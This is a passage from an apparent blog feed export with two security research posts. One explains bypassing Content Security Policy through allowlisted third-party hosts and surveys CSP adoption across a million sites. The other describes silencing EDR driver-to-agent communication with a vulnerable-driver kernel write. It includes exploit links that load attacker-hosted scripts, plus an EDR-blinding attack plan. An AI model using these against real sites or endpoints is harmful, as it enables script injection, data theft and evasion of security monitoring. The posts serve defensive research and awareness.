to execute that code in the victim’s browser, we will see the following in our Facebook Developer account event manager:\nSecret ingredient exfiltrated to the attacker’s Facebook Developer Event Manager.\n\n\n\nAbuse #3 – JS Delivr\nIn this case, using jsdelivr we would be able to execute code. \nI have found this method already being reported on some HackerOne reports, so I’m not claiming this one is originally discovered here, but I think the method is not really well-known, so let’s spread awareness on this one a bit more. \nThis is a sample CSP that can be bypassed:\ndefault-src 'self';\nscript-src 'nonce-3FahAWXnLOYTy8KNO3V6Fsmd' cdn.jsdelivr.net;\n[...]\nAssuming our objective now is to change the victim user password and security answer, we can use the following payload:\n\n\n\n\nThe general steps to follow to execute this payload on the target site that allows cdn.jsdelivr.net would be the following:\nUpload your payload to a new repository in GitHub or npm.\nAsk jsdelivr.com nicely to cache your code by following a very specific URL pattern like this:\n\nGithub: https://cdn.jsdelivr.net/gh/user/repo@version/file\nNPM: https://cdn.jsdelivr.net/npm/package@version/file \nExploit vulnerability #2 by sending the allowed cached script in cdn.jsdelivr.net.\nUpload payload to GitHub\n\n\n\nAsk jsdeliver.net to cache your payload\n\n\n\nNow, to exploit vulnerability #2 in our lab, we just need to send the following link to the victim and hope they click it:\nhttps://jsdelivr.keyfc.com/secret.php?source=https://cdn.jsdelivr.net/gh/felmoltor/bunchofjs/exec.js\nIf the victim clicks on it, the code in “exec.js” will be executed and the password and security answer will be changed:\nPayload executed from cdn.jsdelivr.net\n\n\n\nAbuse #4 – Amazon AWS\nUsing Amazon AWS we would be able to exfiltrate data, but I am confident that it can also be used to execute code. This is a sample CSP that can be bypassed:\ndefault-src 'self';\nscript-src 'nonce-3FahAWXnLOYTy8KNO3V6Fsmd' *.amazonaws.com;\n[...]\nWe need to create two components in our Amazon AWS account:\nAn API Gateway that will be public as a subdomain of amazonaws.com\nA Lambda function to decode the exfiltrated data coming from the API Gateway as a parameter\nThe exfiltration infrastructure on Amazon AWS that bypasses CSP\n\n\n\nThe code to execute on the victim’s browser and the Lambda function code is the following:\n\n\n\n\nIf we get that code executed on the victim’s browser, we will have the following in the attacker’s CloudWatch logs:\n\n\n\n\nAbuses #5, #6, #7, and #8\nI don’t want to make this post longer than it already is, so the other four PoCs are briefly mentioned here. It covers the following four third-party providers:\nAzure AppServices and Static Webapps (~100 sites in the DB)\nAmazon Cloudfront (~100 sites)\nSalesforce Heroku  (~18 sites)\nGoogle Firebase (~15 sites)\nThese four third-party services were not found frequently in the top 1 million sites database, but you never know when you will find them on your next pentest or bug bounty, so they might be useful to you.\nDue to the similarity to the PoC #4, you need just to be aware that the general approach to each of them would be the same:\nRegister an account with the third party\nFollow their guidelines to setup a web application or hosting a project with them, e.g.:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nAzure AppServices and Static Webapps\nAmazon Cloudfront\nHeroku Hosting\nFirebase Hosting\nUpload the attacker payloads to these projects\nTake advantage of the hole in the CSP that allows these third-party domains. For example, to exploit the vulnerability #2 of the laboratory you send the following links to the victim:\n\nhttps://cloudfront.keyfc.com/secret.php?source=https://d15xoolnwhr08.cloudfront.net/js/exec.js\nhttps://azure.keyfc.com/secret.php?source=https://nice-dune-08c8da410.3.azurestaticapps.net/exec.js \nhttps://heroku.keyfc.com/secret.php?source=https://exfiltest-75310ac89c2a.herokuapp.com/exec.js\nhttps://firebase.keyfc.com/secret.php?source=https://demo-defcon.firebaseapp.com/exec.js \n2 – CSP Health Status\nNote: I am assuming you have previous knowledge of what CSP is and what this security mechanism is. Otherwise, refer to the Mozilla site for more information.\nTo obtain a better view of the state of CSP on the Internet, I needed to gather the HTTP headers myself, explore them, parse the CSP information out from these and reach some conclusions. So I decided to retrieve this information from the top 1 million sites on the Internet (In this case: Majestic Million and Cisco Umbrella). For this to work I needed to program something scalable that could scan all those web sites in a reasonable amount of time. \nThe Architecture\nI needed to make some architectural decisions here, such as what database to store the scrapped data into and the programming paradigm to do the scans and parsing of data.\nRegarding the database, I started with a SQLite3 database, jumped later to MySQL in various forms and finally moved to MongoDB. To help me make a decision on which one of them to use, I draw a chart of the time taken to process and introduce 10.000 entries with HTTP header data. \nThe orange line, which represented MongoDB, was clearly the winner in this contest:\nComparison between SQLite3, MySQL, MySQL using foreign keys, and MongoDB\n\n\n\nOk, so now that I have decided what database to use, let’s jump into comparing the different programming paradigms. \nI wanted to compare a classical for loop requesting the headers sequentially with the python library “requests” with an asynchronous programming approach using the python library “aiohttp“.\nI like charts, so let’s compare each approach. Here is the time taken to poll the headers of 500 web sites with both the sequential and asynchronous approach. The blue bar is the sequential approach, which took 26 minutes, and the orange bar represents the asynchronous approach, which took 2:14 minutes.\n\n\n\n\nThis allowed me to reduce the time taken to scan the top 1 million sites form ~32 days to ~3 days. You can take a look at the asyncronous code here.\nGood! Time goes down, stonks go up. \n\n\n\n\nIn summary, the architecture of the solution would look like this: a jumpbox scanning the sites using aiohttp, managing the datasets with the pandas library, then storing the information in a MongoDB, and finally, tapping into this information through a Dashboard programmed with python Dash and Plotly express:\nArchitecture\n\n\n\nAway with the efficiency comparison now. Lets dig into the ingestion process of the data.\nCollect headers from the top 1 million sites chosen (Majestic million and Cisco Umbrella). \nParse the CSP information from the headers.\nAsign the document a country (first by ccTLD, then by IP address geolocation or by WHOIS information)\nSpot weaknesses and potential bypasses (see the first section)\nDashboard – CSP Health Status\nFrom the Dashboard we can obtain interesting information, such as the percentage of sites using CSP, which disappointingly does not reach to a 10%:\nUsage of Content-Security-Policy[-Report-Only] headers\n\n\n\nIf we are to make a bit of self-criticism in the security industry, I would say that we are not doing our job. I would compare this situation to the commercial where 9 out of 10 dentists recommend you to brush your teeth, but its the opposite: 9 out of 10 dentists are not brushing their teeth or encouraging their clients to do so:\n\n\n\n\nJokes aside, luckily, there’s a positive side of it. The most popular sites are implementing CSP more frequently than the less popular sites, as it can be observed in the following chart:\nPercentage of CSP usage across the top 1.000, 10.000 and, 100.000 sites sorted by popularity.\n\n\n\nThe previous chart shows the percentage of CSP usage if we sort the sites by popularity and then take the top 1000, top 10000, and top 100000.\nWe can also explore other information from the dashboard, such as the most used CSP directives:\nMost frequent CSP directives\n\n\n\nWe can observe how the most popular of this list are “upgrade-insecure-requests” and “frame-ancestors“, followed by many other *-src directives. This is understandable from the point of view of a website administrator; the less complicated directives to setup are those two, you don’t need to allowlist anything or to maintain the allowlist, as “upgrade-insecure-requests” is used by itself, without any other value, and the immense majority of “frame-ancestors” values are configured with “self” or “none”.\nThe five least frequently configured directives (and the CSP level where those directives are available) are: \nobject-src (L1)\nmedia-src (L1)\nworker-src (L3)\nbase-uri (L2)\nreport-uri (L1 – Deprecated in favor of report-to)\nClearly, those are not used enough despite the positive impact they can have on the security of your website. Probably due to the lack of understanding what these directives are protecting us against (more on that later).\nIn the dashboard, we can take a look to the specific values configured for each CSP directive. Due to its importance, we will use “script-src” as an example for this:\nMost frequent sources of the directive ‘script-src’ \n\n\n\nWe can observe that the most frequent directive values used are “unsafe-inline” and “unsafe-eval“. Looking from the percentage perspective:\nPresence of “unsafe-inline”: \n\nRelative to sites with CSP headers: 21,898/124,098 = 17%\nRelative to sites defining a “script-src”: 21,898/24,793 = 88%\nPresence of “unsafe-eval”:\n\nRelative to sites with CSP headers: 19,931/124,098 = 16%\nRelative to sites defining a “script-src”: 19,931/24,793 = 80%\nIf we come back to the previous dentist analogy, not only is there one single dentist out of ten that brushes their teeth (implements CSP and defines a “script-src”), but rather that dentist brushes their teeth with sugar 6 days per week:\nTry the new “unsafe-inline” toothpaste. It taste good, but serves for nothing\n\n\n\nMoving on to another topic in the Dashboard. I tried to count the average number of weaknesses per country, just for a bit of fun:\nAverage number of vulnerabilities per country.\n\n\n\nThat intense red colour corresponds to an average count of eight weaknesses per country. No clear winner or medals for anyone here, sorry. \nNow lets talk a bit about the weaknesses, we can take a look at the most frequent ones detected:\nMost frequent CSP weaknesses\n\n\n\nTopping the list we have the lack of “report-to” directives, with 116,991 times this weakness was detected. Keeping in mind that the number of sites with CSP headers is 124,098, this makes this weakness to be present in 94% of the sites with CSP headers. This indicates that most of the sites implementing CSP are currently not actively monitoring potential attacks in real time with this directive (95 of these sites, a 0.08%, were using the deprecated “report-uri” directive instead).\nIt is also very interesting to see that the most updated directive “report-to”, does not even appear in the list of the 18 most used directives, but its old and its deprecated cousin “report-uri” does appear. \nThis might be due to the problem brought to my attention during my Defcon 31 AppSec talk, where naugtur let me know that enabling this directive could potentially lead to a high volume of traffic generated. This could potentially produce a DDoS scenario. Imagine what would happen when a highly-popular site forgets to allowlist their Google Analytics domain on their CSP, as described by Scott Helme here. A way to prevent this scenario would be to use third-party solutions, such as Cloudflare, report-uri.io, which externalise the volumetric problem, or implement your own report-to endpoint having this in mind (one example csp-report-lite). \nAnother possible reason is that “report-to” directive is not yet supported by all major browsers. Specifically, Firefox and Safari do not support it yet, whereas “report-uri” is supported by all major browsers:\nBrowser compatibility of report-to directive as of August 2023\n\n\n\nFollowing on in that list is the “base-uri“, which is not defined in 116,794 of the sites. This is another shocking 94% of the sites defining CSP but not using that feature.\nThis might be due to the lack of clear understanding of what is this directive protecting you against. In this case, against injections changing the <base> HTML tag to arbitrary attacker’s domains. One good example of such attacks is this Gitlab vulnerability disclosed in HackerOne in 2022 (or here and here).\nSo, remember to make a wish if you come across a CSP with those two directives:\nAmazed man, contemplating a CSP with report-to and base-uri directives (1701 sites overall)\n\n\n\nLet’s focus our attention now to the less frequent weaknesses detected:\nLess frequent weaknesses\n\n\n\nWe will look at “Third Party Abuse”. \nIt is found in 11,349 sites, which is a ~9% of the sites implementing CSP. This means, that 9% of the sites contain a weakness that potentially can allow an attacker to bypass the policy by abusing the third-party trust. \nRegarding the last item of the list: “Lenient Scheme“. We find this weakness present in 9,267 sites, which is ~7% of the sites defining CSP. That is, the sites defining a CSP that allows a protocol handler such as “https:” or “http:” within a directive. This means that all resources loaded from a source coming from an “https” channel would be happily allowed. Depending on the directive this source is located in, the impact would be different (e.g. for script-src ‘https:’ all scripts coming from an https will be allowed to be executed within the page context. For connect-src ‘https:’, all outbound connections to an https destination will be allowed).\nThese may look like small percentages, but think about it as almost 1 in every 10 sites that have defined a CSP and expect to have protection against XSS and similar injections, can be bypassed by abusing one of their third-party domains allowed in the policy or by providing a resource coming from an “https:” source. This is a lot of sites that pile onto the ~90% of total sites that do not define CSP and the ~17% of sites defining CSP but allowing “unsafe-inline” and “unsafe-eval”.\nFinally, there is a section in the dashboard where the specific weaknesses can be observed listed in a table form. Some of the weakness that you can query are:\nThird Party Abuse\nOrphan Domains\nUnsafe Eval\nUnsafe Inline\nNo CSP Defined\nOnly CSP-Report-Only Defined\netc.\nOne weakness of that list that we have not yet talked about is the “Orphan Domains”. In this case, the CSP defined a directive allowing a particular domain as a source, such as script-src subdomain.mydomain.com. In the case that mydomain.com is potentially not registered (i.e. we get an NXDOMAIN response from the DNS and Whois do not return any results for this domain), we can consider the CSP is bypasseable: it only requires you to register “mydomain.com” and now you can execute script on the target domain.\nThe dashboard can show us the domains affected by this in the “Weakness” section:\nList of orphan domains detected\n\n\n\nConclusions\nWe have looked at the current status of CSP in Internet in the second section.\n~17% of sites had the “unsafe-inline” value in their CSP and ~16% had the “unsafe-eval” value. \nOther unsafe settings, such as having orphan domains allowed in their policy or lenient handlers, allowing any source or connect destination as long as it conformed to the http: or https: schemes, were also found.\nIt is undeniable that CSP brings effective protection to many sites on the Internet and the standard is still alive and well, with the Level 3 of the standard currently in Working Draft. Which is good news, as it will bring more control and granularity over what content can be executed on the sites.\nBut, sadly, when we look at the usage level, the current status of CSP is not the best across the Internet.\nWe have been living with CSP for a long time (the first level of the policy was approved in 2012, almost 11 years ago), and we are not implementing it broadly. It barely reaches a 30% presence in the top 1000 sites of Internet, but when we increase the scope of the study to a larger set of sites, the percentage drops to a mere 10%.\nI’m not advocating for 100% use of CSP, as there will be static sites with a reduced attack surface where the benefit of implementing it would be minimal when compared to the risk of the page being exposed. But a 10% presence of this useful security feature seems to be a really low number from all perspectives.\nIn the first section, we looked at six new vectors to bypass CSP and two that I have found on HackerOne reports, but were not so well-known, as I could not find blog posts or challenges explaining them in detail.\nApproximately 9% of the sites defining a CSP contained one of the eight instances of “Third-Party Abuse” described here.\nThis indicates that 1 in every 11 sites can potentially have their CSP bypassed due to the blind trust in third-parties.\nThis, in conjunction with the previous unsafe settings described before, makes me think that despite the good mechanism that CSP is, its complexity and the effort required for its maintenance is making people not implement it.\nTo counteract this, the security community and developers need to be clear about the benefits of implementing a CSP and advocate for its safe implementation. For that I have some recommendations.\nRecommendations\nImplement CSP. Despite all the bypasses explained here, it does not mean it is not worth it. It can be an excellent tool to deter attackers and reduce the attack surface your clients and users are exposed to when navigating your web site.\nUse Subresource Integrity (SRI) in conjunction with CSP.\nWhen possible, try not to use the “unsafe-inline” and “unsafe-eval” values. Migrate to strict policies with “nonce” and “hash” directives.\nUse “strict-dynamic” to reduce operational load if that helps your company adopting strict Content Security Policies, but be aware that it gives allowed scripts the capability to include additional scripts.\nReduce allowed third-party domains in your CSP to a minimum. Instead, host the libraries on your own domain where possible.\nIf third-party domains are required in your CSP, do not add them with wildcards (e.g. *.amazonaws.com).\nIf you have enough bandwidth and capabilities, use report-to with report-sample to observe in real time what is happening on your user’s browsers, including potential attacks to them, via your web site.\nConsider using commercial solutions to monitor client-side JavaScript (hint: Search for “client-side protection javascript formjacking” in Google).",
      "content": "TL;DR \n\n",
      "contentSnippet": "TL;DR",
      "guid": "https://sensepost.com/blog/2023/dress-code-the-talk/",
      "isoDate": "2023-08-23T16:29:05.000Z",
      "itunes": {}
    },
    {
      "title": "Filter-Mute Operation: Investigating EDR Internal Communication",
      "link": "https://sensepost.com/blog/2023/filter-mute-operation-investigating-edr-internal-communication/",
      "pubDate": "Fri, 28 Jul 2023 14:38:54 +0000",
      "content:encoded": "<p>For our annual internal hacker conference dubbed SenseCon in 2023, I decided to take a look at communication between a Windows driver and its user-mode process. Here are some details about that journey.</p>\n\n\n\n<h2 class=\"wp-block-heading\">TL;DR</h2>\n\n\n\n<p>Attackers could use Windows kernel R/W exploit primitive to avoid communication between EDR_Driver.sys and its EDR_process.exe. As a result some EDR detection mechanisms will be disabled and make it (partially) blind to malicious payloads. This blogpost describes an alternative approach which doesn&#x2019;t remove kernel callbacks and gives some recommendations for protecting against this &#x201C;filter-mute&#x201D; attack.</p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Overview of EDR_process.exe and EDR_Driver.sys roles</strong></h2>\n\n\n\n<p>The first question that comes to mind is <strong>how does a EDR application (EDR_Process.exe) communicate with its EDR driver (EDR_Driver.sys)?</strong></p>\n\n\n\n<p>Before doing research we must know some EDR basics; how does an EDR agent hook / inject its own DLL during process creation?</p>\n\n\n\n<p>The <mark style=\"background-color:rgba(0, 0, 0, 0);color:#fd0000\" class=\"has-inline-color\">Process Injection via Callbacks</mark> schemas taken from <a href=\"https://www.signal-labs.com/blog/edr-observations\" target=\"_blank\" rel=\"noreferrer noopener\">EDR Observations made by Christopher Vella</a> is a good summary.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_agent_hook.png\"><img loading=\"lazy\" decoding=\"async\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_agent_hook.png\" alt=\"\" class=\"wp-image-68319\" style=\"width:736px;height:611px\" width=\"736\" height=\"611\"></a></figure></div>\n\n\n<p>I have added some comments on what&#x2019;s happening:</p>\n\n\n\n<ol>\n<li>EDR_Driver.sys can subscribe to several kinds of kernel notifications. You can imagine those notifications are like &#x201C;newsletters&#x201D; you subscribe to on the Internet and receive by email from a website. For example EDR_Driver.sys could subscribe to the &#x201C;new process creation&#x201D; notification service using the Windows API named <code>PsSetCreateProcessNotifyRoutine</code> which then, for each process created by the system, the driver will receive information about it (parent PID, command line, etc)</li>\n\n\n\n<li>The user double-clicks on malware.exe</li>\n\n\n\n<li>Windows calls the CreateProcessW API in order to load malware.exe into memory</li>\n\n\n\n<li>EDR_Driver.sys is notified that malware.exe <strong>**will be**</strong> spawned.</li>\n\n\n\n<li>EDR_Driver.sys sends a log to EDR_Process.exe saying &#x201C;Hey! A new process called malware.exe will be started soon.&#x201D;</li>\n\n\n\n<li>EDR_process.exe can choose to take action (or not): &#x201C;Ok I will monitor this process by creating hooks in its ntdll.dll&#x201D;</li>\n\n\n\n<li>When malware.exe runs, it calls the Windows API. Thanks to the hooks in place, EDR_Process.exe knows which APIs are called and can deduce what this malware.exe is doing</li>\n</ol>\n\n\n\n<p>We could take the piece of code below from <a href=\"https://www.ired.team/offensive-security/code-injection-process-injection/process-injection\" target=\"_blank\" rel=\"noreferrer noopener\">ired.team</a> as an example of malware.exe.</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/image-48.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"695\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/image-48-1024x695.png\" alt=\"\" class=\"wp-image-70125\"></a></figure>\n\n\n\n<p>Once hooks are in place, the EDR agent (EDR_process.exe) can monitor / analyse malware.exe. Here is an example of actions it could take:</p>\n\n\n\n<p>1. EDR_Process.exe sees the following Windows API calls that are called by malware.exe:</p>\n\n\n\n<ul>\n<li>OpenProcess</li>\n\n\n\n<li>VirtualAllocEx</li>\n\n\n\n<li>WriteProcessMemory</li>\n\n\n\n<li>CreateRemoteThread</li>\n</ul>\n\n\n\n<p>2. EDR_Process.exe classifies this API call sequence as &#x201C;malicious&#x201D; and blocks (kills) the process.</p>\n\n\n\n<p>3. EDR_Process.exe sends a log to the EDR_C2 (security console) saying &#x201C;Hey, malware.exe process spawned and is classified as malicious&#x201D;.</p>\n\n\n\n<p>Note: this is a common EDR flow and not the only way it could work, for example EDR_Process.exe may only send telemetry data and let the EDR_C2 decide if it&#x2019;s malicious and the action to be applied (block or not).</p>\n\n\n\n<p>If the EDR vendor or the security team operators (aka blueteam) configured a &#x201C;block if malicious&#x201D; rule in the EDR Security Console then the malware.exe process is killed by EDR_Process.exe (or EDR_Driver.sys). Other countermeasures are also available, for example:</p>\n\n\n\n<ul>\n<li>the Windows host could be remotely isolated from the network</li>\n\n\n\n<li>malware.exe file or memory dump could be downloaded for analysis / reversing</li>\n\n\n\n<li>security analyst could run commands on the Windows host (from the security console) for investigation purpose</li>\n\n\n\n<li>&#x2026;</li>\n</ul>\n\n\n\n<p>This point is an important one; the more experienced the blueteam is in creating custom rules, the more difficult for attackers to evade or move laterally into the network without being caught!</p>\n\n\n\n<p>Now before digging into internal communication, I want to take a step back and simplify the EDR behaviour. Internal communication (blue arrows) and external communication (yellow arrows) of the EDR_Process.exe could be visualised with a simple overview:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_com_overview_thick.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"480\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_com_overview_thick.png\" alt=\"\" class=\"wp-image-69122\"></a></figure></div>\n\n\n<h2 class=\"wp-block-heading\"><strong>Digging into EDR internal communication</strong></h2>\n\n\n\n<p>From Windows kernel memory space, EDR_Driver.sys could use several Windows Kernel API&#x2019;s (callbacks) to monitor and then block the malicious system activities. For example the API <strong><code>PsSetCreateProcessNotifyRoutine</code></strong> routine could be used to generate the following &#x201C;monitoring logs&#x201D; messages thanks to the kernel callback mechanism:</p>\n\n\n\n<p>&#x2013; Log = new process created (PID 5376) with cmd Line C:\\notepad.exe</p>\n\n\n\n<p>From usermode memory space, EDR_Process.exe could send action requests to the driver and receive information from it. For example an &#x201C;Action request&#x201D; coming from EDR security console could be:</p>\n\n\n\n<p>&#x2013; Action = denylist C:\\notepad.exe</p>\n\n\n\n<p>In the figure below I tried to map common Windows Kernel callbacks used for monitoring purposes.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/EDR_subscribing.png\"><img loading=\"lazy\" decoding=\"async\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/EDR_subscribing-1024x606.png\" alt=\"\" class=\"wp-image-68329\" style=\"width:1024px;height:606px\" width=\"1024\" height=\"606\"></a></figure></div>\n\n\n<p>The question which comes to mind after making this summary was <strong>how to avoid communication between EDR_process.exe and EDR_driver.sys?</strong></p>\n\n\n\n<h2 class=\"wp-block-heading\"><strong>Blinding EDR using known techniques</strong></h2>\n\n\n\n<p>The most common techniques for blinding EDR sensors are:</p>\n\n\n\n<ol>\n<li>Removing the DLL hooks (userland)</li>\n\n\n\n<li>Removing the kernel callbacks (kernel land)</li>\n</ol>\n\n\n\n<p>Because we only focus on kernel part of EDR, here is a visualisation on what happens when you remove kernel callbacks:</p>\n\n\n\n<p><strong>BEFORE zero out of the EDR callback address</strong>:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/kernelcb_before.png\"><img loading=\"lazy\" decoding=\"async\" width=\"568\" height=\"264\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/kernelcb_before.png\" alt=\"\" class=\"wp-image-68333\"></a></figure>\n\n\n\n<p><strong>AFTER zero out of the EDR callback address</strong>:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/kernelcb_after.png\"><img loading=\"lazy\" decoding=\"async\" width=\"499\" height=\"338\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/kernelcb_after.png\" alt=\"\" class=\"wp-image-68334\"></a></figure>\n\n\n\n<p>We won&#x2019;t go into details on this topic, it&#x2019;s covered in the blogpost <a href=\"https://synzack.github.io/Blinding-EDR-On-Windows/\" target=\"_blank\" rel=\"noreferrer noopener\">Blinding EDR On Windows from Zach Stein</a>.</p>\n\n\n\n<p>But you may notice in the figure below that each time you zero out the EDR callback address it means no more notifications (no &#x201C;newsletter&#x201D;) will be sent from Windows to EDR_Driver.sys. In the end, no event log will be sent to EDR_Process.exe (and security analyst console) anymore!</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/EDR_subscribing_delete.png\"><img loading=\"lazy\" decoding=\"async\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/EDR_subscribing_delete-1024x606.png\" alt=\"\" class=\"wp-image-68335\" style=\"width:1024px;height:606px\" width=\"1024\" height=\"606\"></a></figure></div>\n\n\n<h2 class=\"wp-block-heading\"><strong>Blinding EDR using an alternative approach</strong></h2>\n\n\n\n<p>During my research on this topic I was wondering how to avoid communication between EDR_process.exe and EDR_driver.sys <strong>without any callback modification</strong> ? Could we prevent EDR_process.exe and EDR_Driver.sys from exchanging &#x201C;messages&#x201D;?</p>\n\n\n\n<p>Like I said before, we want to stay on the kernel side of the story. We could imagine this other approach using this graphical representation:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large is-resized\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/EDR_subscribing_preventMsg.png\"><img loading=\"lazy\" decoding=\"async\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/EDR_subscribing_preventMsg-1024x606.png\" alt=\"\" class=\"wp-image-68336\" style=\"width:1024px;height:606px\" width=\"1024\" height=\"606\"></a></figure></div>\n\n\n<p>While I was trying to investigate using Windbg, Yarden Shafir wrote an awesome blog on <a href=\"https://windows-internals.com/investigating-filter-communication-ports/\" target=\"_blank\" rel=\"noreferrer noopener\">Investigating Filter Communication Ports</a> which really helped. I discovered some Windows data structures being manipulated during communication setup between an application and a driver.</p>\n\n\n\n<p>The data structure named <mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000\" class=\"has-inline-color\">FLT_SERVER_PORT_OBJECT</mark> drew my attention because it seemed to contain interesting fields, see if you agree:</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/FLT_SERVER_PORT_OBJECT.png\"><img loading=\"lazy\" decoding=\"async\" width=\"719\" height=\"432\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/FLT_SERVER_PORT_OBJECT.png\" alt=\"\" class=\"wp-image-68337\"></a></figure></div>\n\n\n<p>When I saw this, the first question which came to my mind was <strong>what could happen if we set MaxConnections to zero?</strong></p>\n\n\n\n<p>This data structure is initialised using the Windows Drivers API named <mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000\" class=\"has-inline-color\">FltCreateCommunicationPort</mark>:</p>\n\n\n\n<pre class=\"wp-block-code\"><code>NTSTATUS FLTAPI FltCreateCommunicationPort(\n  [in]           PFLT_FILTER            Filter,\n  [out]          PFLT_PORT              *ServerPort,\n  [in]           POBJECT_ATTRIBUTES     ObjectAttributes,\n  [in, optional] PVOID                  ServerPortCookie,\n  [in]           PFLT_CONNECT_NOTIFY    ConnectNotifyCallback,\n  [in]           PFLT_DISCONNECT_NOTIFY DisconnectNotifyCallback,\n  [in, optional] PFLT_MESSAGE_NOTIFY    MessageNotifyCallback,\n  [in]           LONG                   MaxConnections\n);</code></pre>\n\n\n\n<p><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/fltkernel/nf-fltkernel-fltcreatecommunicationport\" target=\"_blank\" rel=\"noreferrer noopener\">Microsoft documentation</a> gives the following information:</p>\n\n\n\n<figure class=\"wp-block-image size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/FltCreateCommunicationPort.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"269\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/FltCreateCommunicationPort-1024x269.png\" alt=\"\" class=\"wp-image-68339\"></a></figure>\n\n\n\n<p>What could we deduce? If we are able to reset MaxConnections to zero, it will only prevent new connections from happening. Let&#x2019;s go for the following attack plan:</p>\n\n\n\n<ul>\n<li>Step 1: reset MaxConnections value</li>\n\n\n\n<li>Step 2: force EDR_Process.exe to restart (should require high privileges, probably NT SYSTEM)</li>\n\n\n\n<li>Step 3: observe EDR behaviour</li>\n</ul>\n\n\n\n<h2 class=\"wp-block-heading has-larger-font-size\"><strong>Step 1: reset MaxConnections value</strong></h2>\n\n\n\n<p>The first prerequisite for this step is to have a kernel-mode read / write primitive that we can use to set the value to 0. We will use BYOVD (Bring Your Own Vulnerable Driver) technique for this. As a second prerequisite we have to find the address of <em>MaxConnections</em> field in kernel memory right? Let&#x2019;s take a look at how we can get this address!</p>\n\n\n\n<p>The structure <mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000\" class=\"has-inline-color\">fltmgr!_FLT_SERVER_PORT_OBJECT</mark> we discussed previously could be reached by the structure <mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000\" class=\"has-inline-color\">fltmgr!_FLT_FILTER</mark>, which could be reached by the structure <mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000\" class=\"has-inline-color\">fltmgr!_FLTP_FRAME</mark>, which could be reached by the structure <mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000\" class=\"has-inline-color\">FLTMGR!_GLOBALS</mark>, which could be reached by the <mark style=\"background-color:rgba(0, 0, 0, 0);color:#ff0000\" class=\"has-inline-color\">FltMgr.sys</mark> driver. The base address of this kernel module can be retrieved from userland using <strong>NtQuerySystemInformation</strong> Windows API.</p>\n\n\n\n<p>I agree with Alex Ionescu when he said <a href=\"https://www.youtube.com/watch?v=5HbmpPBKVFg\" target=\"_blank\" rel=\"noreferrer noopener\">&#x201C;I got 99 problems but a kernel pointer ain&#x2019;t one&#x201D;</a> :-). We can find <em>MaxConnections</em> address by walking through Windows kernel data structures, starting from FltMgr.sys driver up to this field!</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter size-large\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/FLT_all_simplified.png\"><img loading=\"lazy\" decoding=\"async\" width=\"1024\" height=\"283\" src=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/FLT_all_simplified-1024x283.png\" alt=\"\" class=\"wp-image-68343\"></a></figure></div>\n\n\n<p>This is a bit long for the middle of the blogpost, but if you&#x2019;re curious and want to know how to do this using Windbg, check out the <strong>EXTRA MILE</strong> section at the end: <em>&#x201C;kernel walking, 10 steps to get access to MaxConnections&#x201D;</em></p>\n\n\n\n<p>Here is what it looks like when you want to have a look at details concerning Windows Defender kernel driver:</p>\n\n\n\n<figure class=\"wp-block-image size-full\"><a href=\"https://sensepost.com/img/pages/blog/2023/filter-mute-operation-investigating-edr-internal-communication/edr_snowblast_mute.png\"><img loading=\"lazy\" decoding=\"async\" width=\"871\" height=\"286\" 